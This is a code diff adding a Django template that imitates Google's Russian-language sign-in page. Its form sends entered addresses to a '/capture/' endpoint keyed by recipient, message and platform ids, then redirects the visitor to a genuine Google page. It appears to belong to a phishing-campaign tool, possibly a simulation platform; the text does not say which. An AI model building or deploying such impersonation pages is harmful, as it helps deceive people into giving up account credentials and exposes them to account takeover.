@@ -1,0 +1,162 @@
+<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>Вход - Google Аккаунт</title>
+	<style type="text/css">body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #ffffff;
+            color: #202124;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .card {
+            background: #ffffff;
+            width: 400px;
+            padding: 32px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2), 0 1px 2px rgba(0, 0, 0, 0.06);
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+
+        .logo img {
+            width: 92px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0;
+            margin-bottom: 16px;
+        }
+
+        p {
+            font-size: 14px;
+            color: #5f6368;
+            margin: 0;
+            margin-bottom: 24px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 16px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input[type="text"]:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 3px rgba(26, 115, 232, 0.3);
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .actions a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .actions a:hover {
+            text-decoration: underline;
+        }
+
+        button {
+            background-color: #1a73e8;
+            color: #ffffff;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #1669c1;
+        }
+
+        .footer {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+	</style>
+</head>
+<body>
+<div class="container">
+<div class="card">
+<div class="logo"><img alt="Google" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png"/></div>
+
+<h1>Вход</h1>
+
+<p>Используйте аккаунт Google</p>
+
+<form action="" method="POST">
+    {% csrf_token %}
+    <input name="email" placeholder="Телефон или адрес эл. почты" required="" type="text"/>
+<div class="actions"><a href="#">Забыли адрес электронной почты?</a></div>
+
+<p style="font-size: 12px; color: #5f6368;">Работаете на чужом компьютере? Используйте режим инкогнито. <a href="#">Подробнее</a></p>
+
+<div class="actions" style="justify-content: space-between;"><a href="#">Создать аккаунт</a><button type="submit">Далее</button></div>
+</form>
+</div>
+
+<div class="footer"><a href="#">Русский</a> <a href="#">Справка</a> <a href="#">Конфиденциальность</a> <a href="#">Условия</a></div>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const recipientId = "{{ recipient_id }}";  
+    const messageId = "{{ message_id }}";
+    const platform = "{{ platform }}";  
+    const BASE_URL = "{{ settings.BASE_URL }}"; 
+
+    if (recipientId && platform) {
+        document.querySelector("form").action = `${BASE_URL}/capture/${recipientId}/${messageId}/${platform}/`;
+    }
+
+    document.querySelector("form").addEventListener("submit", function(event) {
+        event.preventDefault();  // Предотвращаем стандартную отправку формы
+
+        // Указываем ссылку, на которую нужно перенаправить пользователя
+        const redirectUrl = "https://www.google.com/intl/ru/account/about/"; // Замените на нужный URL
+
+        // Перенаправляем пользователя
+        window.location.href = redirectUrl;
+    });
+</script>
+
+</body></html>
